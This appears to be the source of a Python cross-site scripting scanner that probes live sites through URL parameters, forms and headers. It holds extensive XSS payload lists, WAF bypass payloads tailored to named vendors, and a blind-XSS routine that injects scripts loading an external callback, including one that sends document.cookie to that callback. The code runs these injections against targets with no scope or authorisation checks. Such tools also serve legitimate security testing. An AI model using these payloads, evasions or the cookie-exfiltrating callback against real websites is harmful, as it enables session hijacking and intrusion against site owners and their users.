"""
XSS Scanner v1.0 — Cross-Site Scripting Detection Engine

Features:
1. Reflected XSS — parameter reflection testing with context-aware payloads
2. DOM-based XSS — source/sink analysis in JavaScript
3. Stored XSS — input submission + verification on output pages
4. Blind XSS — callback-based payload injection
5. Context detection — HTML tag, attribute, JS string, URL, CSS contexts
6. WAF bypass — encoding tricks, event handlers, polyglots per detected WAF
7. Parameter reflection pre-check (Gxss/kxss-style) before full payload testing
8. Multi-injection-point — URL params, POST body, headers, cookies
9. Smart payload selection — only payloads relevant to detected context

Integrates with: WAFDetector, RecursiveCrawler, SecretExtractor
"""

import re
import asyncio
import aiohttp
import random
import hashlib
import html
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from loguru import logger


# ──────────────────────────────────────────────────────────────────
# Data classes
# ──────────────────────────────────────────────────────────────────

@dataclass
class XSSResult:
    """Result of XSS testing on a single parameter."""
    url: str
    parameter: str
    vulnerable: bool = False
    xss_type: str = ""           # reflected, dom, stored, blind
    context: str = ""            # html_tag, html_attr, js_string, js_block, url, css, comment
    payload_used: str = ""
    evidence: str = ""           # reflected snippet from response
    confidence: float = 0.0      # 0.0 - 1.0
    injection_point: str = "url" # url, post, header, cookie
    waf_bypassed: str = ""       # WAF name if bypass was needed
    severity: str = "high"       # critical, high, medium, low


@dataclass
class ReflectionResult:
    """Quick reflection check result."""
    url: str
    parameter: str
    reflected: bool = False
    context: str = ""            # Where the reflection appears
    chars_allowed: List[str] = field(default_factory=list)  # Which special chars reflect
    encoding_applied: str = ""   # html_entity, url_encode, js_escape, none


# ──────────────────────────────────────────────────────────────────
# Payload databases
# ──────────────────────────────────────────────────────────────────

# Reflection probe — unique random marker to detect reflection
def _make_probe() -> str:
    return f"xPr0b3{random.randint(10000, 99999)}"

# Context-detection probes — test which special chars survive
CHAR_PROBES = ['<', '>', '"', "'", '/', '\\', '(', ')', '{', '}', '`', ';', '=']

# ── Reflected XSS payloads by context ──
HTML_TAG_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
]

HTML_ATTR_PAYLOADS = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" autofocus onfocus="alert(1)',
    "' autofocus onfocus='alert(1)",
    '" onfocus=alert(1) autofocus="',
    "' onfocus=alert(1) autofocus='",
    '" style="animation-name:x" onanimationstart="alert(1)',
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    '" onpointerenter=alert(1) style="position:fixed;top:0;left:0;width:100%;height:100%',
]

JS_STRING_PAYLOADS = [
    "';alert(1)//",
    '";alert(1)//',
    "\\';alert(1)//",
    '\\";alert(1)//',
    "</script><img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    '"-alert(1)-"',
    "'+alert(1)+'",
    '`-alert(1)-`',
    "\\x3cimg src=x onerror=alert(1)\\x3e",
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
]

JS_BLOCK_PAYLOADS = [
    "};alert(1);//",
    "}alert(1)//",
    ");alert(1)//",
    "]-alert(1)-[",
    "}/alert(1)/",
]

URL_CONTEXT_PAYLOADS = [
    "javascript:alert(1)",
    "javascript:alert(1)//",
    "data:text/html,<script>alert(1)</script>",
    "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
]

# ── WAF bypass payloads ──
WAF_BYPASS_PAYLOADS = {
    "cloudflare": [
        '<a href="j&#97;v&#97;script:alert(1)">click',
        '<svg/onload=&#97;lert(1)>',
        '<img src=x onerror="a]lert(1)".replace("]","")>',
        '"><img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<svg/onload=eval(atob`YWxlcnQoMSk`)>',
        '<details/open/ontoggle=self["al"+"ert"](1)>',
    ],
    "modsecurity": [
        '<img src=x onerror=\u0061lert(1)>',
        '<svg/onload=&#x61;lert(1)>',
        '"><i]mg src=x onerror=alert(1)>'.replace(']', ''),
        '<svg onload=top[/al/.source+/ert/.source](1)>',
        '%3Csvg%20onload%3Dalert(1)%3E',
    ],
    "aws_waf": [
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        '"><svg/onload=eval(atob`YWxlcnQoMSk`)>',
        '<svg onload=window["al"+"ert"](1)>',
        '<details open ontoggle=alert`1`>',
    ],
    "wordfence": [
        '<div style=width:expression(alert(1))>',
        '"><details/open/ontoggle=confirm(1)>',
        '<svg onload=self["ale"+"rt"](1)>',
        '<img src onerror=Function`a]lert\\x281\\x29```>',
    ],
    "sucuri": [
        '<a onmouseover=alert(1)>hover</a>',
        '"><svg/onload=confirm(1)>',
        '<svg/onload=eval(atob("YWxlcnQoMSk="))>',
    ],
    "imperva": [
        '<svg onload=al\\u0065rt(1)>',
        '"><img src=x one]rror=alert(1)>'.replace(']', ''),
        '<svg/OnLoad="`${alert`1`}`">',
        '<details open ontoggle=self["\\x61lert"](1)>',
    ],
    "f5_bigip": [
        '<svg onload=top["al"+"ert"](1)>',
        '<img src=x onerror=eval("\\x61lert(1)")>',
        '"><svg/onload=&#97;lert(1)>',
    ],
}

# ── Polyglot payloads (work in multiple contexts) ──
POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0telerik%0t/telerik/src=xss)%20telerik>%22%27><svg/onload=alert(1)//>",
    "'\"-->]]>*/</script></style></title></textarea><svg/onload=alert(1)>",
    "'-alert(1)-'",
    "\"><img src=x onerror=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
]

# ── DOM Sources & Sinks for DOM-based XSS ──
DOM_SOURCES = [
    r'document\.URL', r'document\.documentURI', r'document\.baseURI',
    r'location\.href', r'location\.search', r'location\.hash',
    r'location\.pathname', r'document\.cookie', r'document\.referrer',
    r'window\.name', r'history\.pushState', r'history\.replaceState',
    r'localStorage\.getItem', r'sessionStorage\.getItem',
    r'postMessage',
]

DOM_SINKS = [
    r'\.innerHTML\s*=', r'\.outerHTML\s*=', r'\.insertAdjacentHTML\s*\(',
    r'document\.write\s*\(', r'document\.writeln\s*\(',
    r'eval\s*\(', r'setTimeout\s*\(', r'setInterval\s*\(',
    r'Function\s*\(', r'\.src\s*=', r'\.href\s*=', r'\.action\s*=',
    r'\.setAttribute\s*\(\s*["\'](?:href|src|action|data)',
    r'jQuery\s*\(', r'\$\s*\(', r'\.html\s*\(', r'\.append\s*\(',
    r'\.after\s*\(', r'\.before\s*\(', r'\.prepend\s*\(',
    r'window\.location\s*=', r'location\.assign\s*\(',
    r'location\.replace\s*\(',
]


# ──────────────────────────────────────────────────────────────────
# XSS Scanner
# ──────────────────────────────────────────────────────────────────

class XSSScanner:
    """Full XSS detection engine — reflected, DOM, stored, blind."""

    def __init__(self, config=None):
        self.config = config
        self.max_params = 10      # Max params to test per URL
        self.max_payloads = 15    # Max payloads per param per context
        self.timeout = 15
        self.concurrency = 3      # Concurrent param tests
        self._semaphore = asyncio.Semaphore(self.concurrency)

    # ──────────────────────────────────────────────────────────
    # Main entry point
    # ──────────────────────────────────────────────────────────

    async def scan(
        self,
        url: str,
        session: aiohttp.ClientSession,
        waf_name: str = None,
        check_dom: bool = True,
        check_stored: bool = False,
        blind_callback: str = None,
    ) -> List[XSSResult]:
        """
        Full XSS scan on a URL.
        
        1. Extract parameters from URL
        2. Reflection pre-check (fast — determines if param reflects at all)
        3. Context detection (where in the HTML does it reflect?)
        4. Context-specific payload injection
        5. DOM-based XSS analysis (if HTML available)
        6. Blind XSS injection (if callback URL provided)
        
        Args:
            url: Target URL with parameters
            session: aiohttp session
            waf_name: Detected WAF name for bypass payloads
            check_dom: Whether to analyze JS for DOM XSS
            check_stored: Whether to check for stored XSS
            blind_callback: Callback URL for blind XSS (e.g. https://your.xss.ht)
            
        Returns:
            List of XSSResult for each vulnerable parameter
        """
        results: List[XSSResult] = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            # No URL params — still check DOM and POST forms
            if check_dom:
                dom_results = await self._check_dom_xss(url, session)
                results.extend(dom_results)
            return results

        # Prioritize interesting params
        param_names = self._prioritize_params(list(params.keys()))[:self.max_params]
        logger.info(f"[XSS] Testing {len(param_names)} params on {url[:60]}")

        # Phase 1: Reflection pre-check (fast)
        reflections: Dict[str, ReflectionResult] = {}
        for pname in param_names:
            ref = await self._check_reflection(url, pname, params, session)
            if ref.reflected:
                reflections[pname] = ref
                logger.debug(f"[XSS] Reflection found: {pname} in {ref.context} context "
                            f"(chars: {ref.chars_allowed})")

        if not reflections:
            logger.debug(f"[XSS] No reflections found on {url[:60]}")
            # Still check DOM XSS
            if check_dom:
                dom_results = await self._check_dom_xss(url, session)
                results.extend(dom_results)
            return results

        logger.info(f"[XSS] {len(reflections)} reflecting params — testing payloads")

        # Phase 2: Context-aware payload injection
        tasks = []
        for pname, ref in reflections.items():
            tasks.append(self._test_param_xss(url, pname, params, ref, session, waf_name))

        param_results = await asyncio.gather(*tasks, return_exceptions=True)
        for pr in param_results:
            if isinstance(pr, list):
                results.extend(pr)
            elif isinstance(pr, Exception):
                logger.debug(f"[XSS] Param test error: {pr}")

        # Phase 3: DOM-based XSS
        if check_dom:
            dom_results = await self._check_dom_xss(url, session)
            results.extend(dom_results)

        # Phase 4: Blind XSS injection
        if blind_callback:
            await self._inject_blind_xss(url, params, session, blind_callback)

        if results:
            logger.info(f"[XSS] Found {len(results)} XSS vulnerabilities on {url[:60]}")

        return results

    # ──────────────────────────────────────────────────────────
    # Parameter prioritization
    # ──────────────────────────────────────────────────────────

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """Sort params by XSS likelihood."""
        HIGH_PRIORITY = {
            'q', 'query', 'search', 'keyword', 'term', 's', 'name', 'title',
            'msg', 'message', 'text', 'comment', 'body', 'content', 'value',
            'input', 'data', 'url', 'redirect', 'return', 'next', 'ref',
            'callback', 'error', 'err', 'debug', 'test', 'preview',
            'email', 'user', 'username', 'pass', 'password', 'login',
        }
        MEDIUM_PRIORITY = {
            'id', 'page', 'p', 'cat', 'category', 'type', 'action', 'cmd',
            'file', 'path', 'dir', 'folder', 'view', 'show', 'display',
            'sort', 'order', 'filter', 'tag', 'label',
        }
        LOW_PRIORITY = {
            'lang', 'locale', 'theme', 'style', 'format', 'output',
            'width', 'height', 'size', 'limit', 'offset', 'per_page',
        }

        def score(p):
            pl = p.lower()
            if pl in HIGH_PRIORITY:
                return 0
            if pl in MEDIUM_PRIORITY:
                return 1
            if pl in LOW_PRIORITY:
                return 3
            return 2

        return sorted(params, key=score)

    # ──────────────────────────────────────────────────────────
    # Reflection pre-check
    # ──────────────────────────────────────────────────────────

    async def _check_reflection(
        self, url: str, param: str, params: Dict, session: aiohttp.ClientSession,
    ) -> ReflectionResult:
        """
        Check if a parameter value reflects in the response body.
        
        1. Inject unique probe string
        2. Check if it appears in response
        3. Test which special characters survive (< > " ' etc.)
        4. Determine reflection context
        """
        result = ReflectionResult(url=url, parameter=param)
        probe = _make_probe()

        try:
            test_url = self._inject_param(url, param, params, probe)
            async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=self.timeout),
                                   allow_redirects=True) as resp:
                body = await resp.text(errors='replace')

            if probe not in body:
                return result

            result.reflected = True

            # Test special characters
            char_probe = f"{probe}{''.join(CHAR_PROBES)}{probe}"
            test_url2 = self._inject_param(url, param, params, char_probe)
            async with session.get(test_url2, ssl=False, timeout=aiohttp.ClientTimeout(total=self.timeout),
                                   allow_redirects=True) as resp2:
                body2 = await resp2.text(errors='replace')

            # Find which chars survived
            for ch in CHAR_PROBES:
                if ch in body2:
                    # Check it's actually our injected char, not pre-existing
                    # Look for our probe near the char
                    idx = body2.find(probe)
                    if idx != -1:
                        # Check chars within 50 chars after first probe
                        nearby = body2[idx:idx + len(char_probe) + 50]
                        if ch in nearby:
                            result.chars_allowed.append(ch)

            # Determine context
            result.context = self._detect_context(body, probe)

            # Detect encoding
            if f"&lt;" in body2 or f"&gt;" in body2 or f"&amp;" in body2 or f"&quot;" in body2:
                result.encoding_applied = "html_entity"
            elif quote(probe) in body and probe not in body:
                result.encoding_applied = "url_encode"

        except Exception as e:
            logger.debug(f"[XSS] Reflection check failed for {param}: {e}")

        return result

    def _detect_context(self, body: str, probe: str) -> str:
        """Determine where the probe reflects in the HTML."""
        idx = body.find(probe)
        if idx == -1:
            return "unknown"

        # Look at surrounding 200 chars
        before = body[max(0, idx - 200):idx]
        after = body[idx + len(probe):idx + len(probe) + 200]

        # Inside <script> block?
        last_script_open = before.rfind('<script')
        last_script_close = before.rfind('</script')
        if last_script_open > last_script_close:
            # Check if inside a string
            # Count unescaped quotes between <script and probe
            script_segment = before[last_script_open:]
            single_quotes = len(re.findall(r"(?<!\\)'", script_segment))
            double_quotes = len(re.findall(r'(?<!\\)"', script_segment))
            backticks = len(re.findall(r'(?<!\\)`', script_segment))
            
            if single_quotes % 2 == 1 or double_quotes % 2 == 1 or backticks % 2 == 1:
                return "js_string"
            return "js_block"

        # Inside HTML comment?
        last_comment_open = before.rfind('<!--')
        last_comment_close = before.rfind('-->')
        if last_comment_open > last_comment_close:
            return "comment"

        # Inside a tag attribute?
        last_tag_open = before.rfind('<')
        last_tag_close = before.rfind('>')
        if last_tag_open > last_tag_close:
            # We're inside a tag — check if in attribute
            tag_content = before[last_tag_open:]
            if '=' in tag_content:
                # Inside an attribute value
                return "html_attr"
            return "html_tag"  # Inside tag but not attribute

        # Inside <style>?
        last_style_open = before.rfind('<style')
        last_style_close = before.rfind('</style')
        if last_style_open > last_style_close:
            return "css"

        # Inside href/src/action attribute specifically?
        url_attr_match = re.search(r'(?:href|src|action|data|formaction)\s*=\s*["\']?[^"\'>\s]*$', before, re.I)
        if url_attr_match:
            return "url"

        # Default: HTML body context
        return "html_tag"

    # ──────────────────────────────────────────────────────────
    # Context-aware payload testing
    # ──────────────────────────────────────────────────────────

    async def _test_param_xss(
        self, url: str, param: str, params: Dict,
        reflection: ReflectionResult, session: aiohttp.ClientSession,
        waf_name: str = None,
    ) -> List[XSSResult]:
        """Test a single reflecting parameter with context-specific payloads."""
        results = []
        context = reflection.context
        chars = set(reflection.chars_allowed)

        # Select payloads based on context
        payloads = self._select_payloads(context, chars, waf_name)

        async with self._semaphore:
            for payload in payloads[:self.max_payloads]:
                try:
                    xss = await self._test_single_payload(url, param, params, payload, session, context)
                    if xss and xss.vulnerable:
                        xss.waf_bypassed = waf_name or ""
                        results.append(xss)
                        logger.info(f"[XSS] VULNERABLE: {param}={payload[:40]} on {url[:50]}")
                        break  # Found one, move on

                    # Small delay to avoid rate limiting
                    await asyncio.sleep(random.uniform(0.1, 0.3))

                except Exception as e:
                    logger.debug(f"[XSS] Payload test error: {e}")

        return results

    def _select_payloads(self, context: str, chars: Set[str], waf_name: str = None) -> List[str]:
        """Select payloads appropriate for the detected context and allowed chars."""
        payloads = []

        # Always try polyglots first (most versatile)
        payloads.extend(POLYGLOT_PAYLOADS[:2])

        # Context-specific payloads
        if context == "html_tag":
            if '<' in chars and '>' in chars:
                payloads.extend(HTML_TAG_PAYLOADS)
            else:
                # Can't inject tags — try event handlers if inside a tag
                payloads.extend(HTML_ATTR_PAYLOADS[:3])

        elif context == "html_attr":
            if '"' in chars or "'" in chars:
                payloads.extend(HTML_ATTR_PAYLOADS)
            # Also try breaking out of attribute
            if '<' in chars and '>' in chars:
                payloads.extend(HTML_TAG_PAYLOADS[:3])

        elif context == "js_string":
            payloads.extend(JS_STRING_PAYLOADS)
            if '<' in chars:
                payloads.append("</script><img src=x onerror=alert(1)>")

        elif context == "js_block":
            payloads.extend(JS_BLOCK_PAYLOADS)
            payloads.extend(JS_STRING_PAYLOADS[:3])

        elif context == "url":
            payloads.extend(URL_CONTEXT_PAYLOADS)

        elif context == "css":
            payloads.extend([
                "expression(alert(1))",
                "url(javascript:alert(1))",
                "}</style><img src=x onerror=alert(1)>",
            ])

        elif context == "comment":
            payloads.extend([
                "--><img src=x onerror=alert(1)>",
                "--><svg onload=alert(1)>",
                "--><script>alert(1)</script><!--",
            ])

        else:
            # Unknown context — try everything
            payloads.extend(HTML_TAG_PAYLOADS[:5])
            payloads.extend(HTML_ATTR_PAYLOADS[:3])
            payloads.extend(JS_STRING_PAYLOADS[:3])

        # Add WAF bypass payloads if WAF detected
        if waf_name:
            waf_key = waf_name.lower().replace(' ', '_').replace('-', '_')
            for key, bypasses in WAF_BYPASS_PAYLOADS.items():
                if key in waf_key:
                    payloads = bypasses + payloads  # Bypass payloads first
                    break

        return payloads

    async def _test_single_payload(
        self, url: str, param: str, params: Dict,
        payload: str, session: aiohttp.ClientSession, context: str,
    ) -> Optional[XSSResult]:
        """Inject a single payload and check if it executes."""
        test_url = self._inject_param(url, param, params, payload)

        try:
            async with session.get(test_url, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=self.timeout),
                                   allow_redirects=True) as resp:
                body = await resp.text(errors='replace')
                status = resp.status

            if status >= 400:
                return None

            # Check if payload reflects unencoded
            if self._payload_reflected(body, payload):
                # Verify it's actually exploitable (not just reflected but neutered)
                confidence = self._calculate_confidence(body, payload, context)
                if confidence >= 0.5:
                    # Extract evidence (100 chars around the reflection)
                    evidence = self._extract_evidence(body, payload)
                    return XSSResult(
                        url=url,
                        parameter=param,
                        vulnerable=True,
                        xss_type="reflected",
                        context=context,
                        payload_used=payload,
                        evidence=evidence,
                        confidence=confidence,
                        injection_point="url",
                        severity="high" if confidence >= 0.8 else "medium",
                    )

        except Exception as e:
            logger.debug(f"[XSS] Request failed: {e}")

        return None

    def _payload_reflected(self, body: str, payload: str) -> bool:
        """Check if the XSS payload reflects in the response without sanitization."""
        # Direct reflection
        if payload in body:
            return True

        # Check key attack portions
        # For tag-based: check if <svg or <img with event handler survived
        tag_patterns = [
            r'<(?:img|svg|details|input|body|marquee|video|audio|iframe)\b[^>]*\bon\w+\s*=',
            r'<script[^>]*>[^<]*alert',
        ]
        for pat in tag_patterns:
            if re.search(pat, body, re.I):
                # Verify this is our injected payload, not a pre-existing one
                if any(trigger in body for trigger in ['alert(1)', 'alert`1`', 'confirm(1)', 'prompt(1)']):
                    return True

        # For attribute-based: check if event handler was injected
        if 'onmouseover=' in payload or 'onfocus=' in payload or 'ontoggle=' in payload:
            if any(evt in body for evt in ['onmouseover=', 'onfocus=', 'ontoggle=', 'onload=']):
                if 'alert(1)' in body or 'confirm(1)' in body:
                    return True

        return False

    def _calculate_confidence(self, body: str, payload: str, context: str) -> float:
        """Calculate confidence that the XSS is actually exploitable."""
        confidence = 0.0

        # Direct unencoded reflection in appropriate context
        if payload in body:
            confidence = 0.7

            # Inside <script> or event handler — very high confidence
            if 'alert(1)' in body or 'alert`1`' in body:
                # Check it's not inside an encoded/escaped context
                idx = body.find(payload)
                if idx != -1:
                    before_50 = body[max(0, idx - 50):idx].lower()
                    if '<script' in before_50 or 'on' in before_50:
                        confidence = 0.95
                    else:
                        confidence = 0.85

            # Event handler present and unescaped
            if re.search(r'\bon\w+\s*=\s*["\']?[^"\'>\s]*alert', body, re.I):
                confidence = max(confidence, 0.9)

        # Partial reflection with critical chars
        elif '<' in body and 'onerror=' in body:
            confidence = 0.6

        # Encoded reflection — lower confidence
        elif html.escape(payload) in body:
            confidence = 0.1  # HTML-encoded, probably not exploitable

        return confidence

    def _extract_evidence(self, body: str, payload: str) -> str:
        """Extract a snippet of the response showing the reflected payload."""
        idx = body.find(payload)
        if idx == -1:
            # Try finding key parts
            for fragment in ['alert(1)', '<svg', '<img', 'onerror=']:
                idx = body.find(fragment)
                if idx != -1:
                    break
        if idx == -1:
            return ""

        start = max(0, idx - 50)
        end = min(len(body), idx + len(payload) + 50)
        snippet = body[start:end].replace('\n', ' ').replace('\r', '').strip()
        return snippet[:200]

    # ──────────────────────────────────────────────────────────
    # DOM-based XSS detection
    # ──────────────────────────────────────────────────────────

    async def _check_dom_xss(self, url: str, session: aiohttp.ClientSession) -> List[XSSResult]:
        """Analyze JavaScript in the page for DOM-based XSS source/sink patterns."""
        results = []

        try:
            async with session.get(url, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                body = await resp.text(errors='replace')
        except Exception:
            return results

        # Extract all inline <script> blocks
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S | re.I)
        all_js = '\n'.join(scripts)

        if not all_js:
            return results

        # Find source→sink flows
        found_sources = []
        found_sinks = []

        for src_pat in DOM_SOURCES:
            matches = re.findall(src_pat, all_js)
            if matches:
                found_sources.extend(matches)

        for sink_pat in DOM_SINKS:
            matches = re.findall(sink_pat, all_js)
            if matches:
                found_sinks.extend(matches)

        if found_sources and found_sinks:
            # Check for direct source→sink flows (simplified heuristic)
            # Look for patterns like: element.innerHTML = location.hash
            for source in DOM_SOURCES:
                for sink in DOM_SINKS:
                    # Look for lines containing both a source and a sink
                    pattern = f"({source}).*({sink})|({sink}).*({source})"
                    matches = re.findall(pattern, all_js, re.I)
                    if matches:
                        results.append(XSSResult(
                            url=url,
                            parameter="DOM",
                            vulnerable=True,
                            xss_type="dom",
                            context="js_block",
                            payload_used=f"source: {source}, sink: {sink}",
                            evidence=f"DOM flow: {source} → {sink}",
                            confidence=0.6,  # Heuristic — needs manual verification
                            injection_point="dom",
                            severity="medium",
                        ))
                        break
                if results:
                    break

        # Also flag dangerous patterns even without clear flow
        dangerous_patterns = [
            (r'document\.write\s*\(\s*(?:location|document\.URL|document\.referrer)', 0.8),
            (r'\.innerHTML\s*=\s*(?:location|document\.URL|window\.name)', 0.8),
            (r'eval\s*\(\s*(?:location|document\.URL|decodeURIComponent)', 0.9),
            (r'\$\s*\(\s*(?:location\.hash|window\.name|document\.referrer)', 0.7),
            (r'jQuery\s*\(\s*(?:location\.hash|window\.name)', 0.7),
        ]

        for pat, conf in dangerous_patterns:
            if re.search(pat, all_js, re.I):
                results.append(XSSResult(
                    url=url,
                    parameter="DOM",
                    vulnerable=True,
                    xss_type="dom",
                    context="js_block",
                    payload_used=pat,
                    evidence=f"Dangerous DOM pattern: {pat}",
                    confidence=conf,
                    injection_point="dom",
                    severity="high" if conf >= 0.8 else "medium",
                ))

        return results

    # ──────────────────────────────────────────────────────────
    # Blind XSS injection
    # ──────────────────────────────────────────────────────────

    async def _inject_blind_xss(
        self, url: str, params: Dict, session: aiohttp.ClientSession,
        callback_url: str,
    ):
        """Inject blind XSS payloads targeting admin panels / log viewers."""
        blind_payloads = [
            f'"><script src={callback_url}></script>',
            f"'><script src={callback_url}></script>",
            f'"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'{callback_url}\';document.body.appendChild(s)">',
            f'{{{{constructor.constructor("fetch(\'{callback_url}?c="+document.cookie+"\')")()}}}}',
        ]

        for pname in list(params.keys())[:5]:
            for payload in blind_payloads[:2]:
                try:
                    test_url = self._inject_param(url, pname, params, payload)
                    async with session.get(test_url, ssl=False,
                                          timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                        await resp.read()  # Just send it
                    logger.debug(f"[XSS-Blind] Injected into {pname} on {url[:50]}")
                except Exception:
                    pass
                await asyncio.sleep(0.2)

    # ──────────────────────────────────────────────────────────
    # POST-based XSS (form testing)
    # ──────────────────────────────────────────────────────────

    async def scan_forms(
        self, url: str, html_body: str, session: aiohttp.ClientSession,
        waf_name: str = None,
    ) -> List[XSSResult]:
        """Extract forms from HTML and test form fields for XSS."""
        results = []

        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html_body, 'html.parser')
        except Exception:
            return results

        forms = soup.find_all('form')
        for form in forms[:3]:  # Max 3 forms
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            # Resolve action URL
            if action:
                from urllib.parse import urljoin
                action_url = urljoin(url, action)
            else:
                action_url = url

            # Extract form fields
            fields = {}
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if not name:
                    continue
                value = inp.get('value', '')
                input_type = inp.get('type', 'text').lower()
                if input_type in ('hidden', 'submit', 'button', 'image', 'reset'):
                    fields[name] = value  # Keep as-is
                else:
                    fields[name] = value  # Will be replaced with payload

            if not fields:
                continue

            # Test each non-hidden field
            testable = [n for n in fields if 
                        form.find(['input', 'textarea'], {'name': n}) and
                        form.find(['input', 'textarea'], {'name': n}).get('type', 'text') 
                        not in ('hidden', 'submit', 'button')]

            for field_name in testable[:5]:
                probe = _make_probe()
                test_data = dict(fields)
                test_data[field_name] = probe

                try:
                    if method == 'post':
                        async with session.post(action_url, data=test_data, ssl=False,
                                               timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                            body = await resp.text(errors='replace')
                    else:
                        async with session.get(action_url, params=test_data, ssl=False,
                                              timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                            body = await resp.text(errors='replace')

                    if probe in body:
                        # Reflected — test with actual payloads
                        context = self._detect_context(body, probe)
                        payloads = self._select_payloads(
                            context, set(CHAR_PROBES), waf_name,
                        )[:5]

                        for payload in payloads:
                            test_data2 = dict(fields)
                            test_data2[field_name] = payload

                            try:
                                if method == 'post':
                                    async with session.post(action_url, data=test_data2, ssl=False,
                                                           timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp2:
                                        body2 = await resp2.text(errors='replace')
                                else:
                                    async with session.get(action_url, params=test_data2, ssl=False,
                                                          timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp2:
                                        body2 = await resp2.text(errors='replace')

                                if self._payload_reflected(body2, payload):
                                    confidence = self._calculate_confidence(body2, payload, context)
                                    if confidence >= 0.5:
                                        results.append(XSSResult(
                                            url=action_url,
                                            parameter=field_name,
                                            vulnerable=True,
                                            xss_type="reflected",
                                            context=context,
                                            payload_used=payload,
                                            evidence=self._extract_evidence(body2, payload),
                                            confidence=confidence,
                                            injection_point="post",
                                            waf_bypassed=waf_name or "",
                                            severity="high",
                                        ))
                                        break
                            except Exception:
                                continue

                except Exception as e:
                    logger.debug(f"[XSS] Form test failed: {e}")

        return results

    # ──────────────────────────────────────────────────────────
    # Header-based XSS
    # ──────────────────────────────────────────────────────────

    async def scan_headers(
        self, url: str, session: aiohttp.ClientSession,
    ) -> List[XSSResult]:
        """Test for XSS via HTTP headers (Referer, User-Agent, etc.)."""
        results = []
        probe = _make_probe()

        headers_to_test = {
            'Referer': f'https://evil.com/{probe}',
            'User-Agent': f'Mozilla/5.0 {probe}',
            'X-Forwarded-For': probe,
            'X-Forwarded-Host': probe,
        }

        for header_name, header_value in headers_to_test.items():
            try:
                hdrs = {header_name: header_value}
                async with session.get(url, headers=hdrs, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    body = await resp.text(errors='replace')

                if probe in body:
                    # Header value reflects — try XSS payload
                    context = self._detect_context(body, probe)
                    payload = '"><img src=x onerror=alert(1)>'
                    hdrs2 = {header_name: header_value.replace(probe, payload)}
                    
                    async with session.get(url, headers=hdrs2, ssl=False,
                                          timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp2:
                        body2 = await resp2.text(errors='replace')

                    if self._payload_reflected(body2, payload):
                        confidence = self._calculate_confidence(body2, payload, context)
                        if confidence >= 0.5:
                            results.append(XSSResult(
                                url=url,
                                parameter=header_name,
                                vulnerable=True,
                                xss_type="reflected",
                                context=context,
                                payload_used=payload,
                                evidence=self._extract_evidence(body2, payload),
                                confidence=confidence,
                                injection_point="header",
                                severity="medium",
                            ))

            except Exception as e:
                logger.debug(f"[XSS] Header test error ({header_name}): {e}")

        return results

    # ──────────────────────────────────────────────────────────
    # Utility
    # ──────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, params: Dict, value: str) -> str:
        """Build URL with modified parameter value."""
        parsed = urlparse(url)
        new_params = {}
        for k, v in params.items():
            if k == param:
                new_params[k] = value
            else:
                new_params[k] = v[0] if isinstance(v, list) else v
        new_query = urlencode(new_params, doseq=False)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))
